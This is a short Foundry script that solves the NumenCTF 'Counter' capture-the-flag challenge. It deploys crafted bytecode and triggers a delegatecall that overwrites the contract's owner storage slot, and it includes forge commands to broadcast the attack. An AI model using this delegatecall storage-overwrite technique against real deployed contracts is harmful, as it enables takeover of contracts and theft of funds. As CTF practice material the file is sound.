// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

// forge script src/NumenCTF/Counter/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --sig "run(address)" $INSTANCE_ADDRESS --legacy
// forge script src/NumenCTF/Counter/Exploit.s.sol:ExploitScript -vvvvv --private-key $PRIVATE_KEY --fork-url $RPC_URL --sig "run(address)" $INSTANCE_ADDRESS --legacy --broadcast

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        ISmartCounter counter = ISmartCounter(instanceAddress);
        vm.startBroadcast();
        counter.create(hex"3260005560006020f3");
        counter.A_delegateccall("");
        require(counter.isSolved());
        vm.stopBroadcast();
    }
}

interface ISmartCounter {
    function create(bytes memory code) external;
    function A_delegateccall(bytes memory data) external;
    function isSolved() external view returns (bool);
}
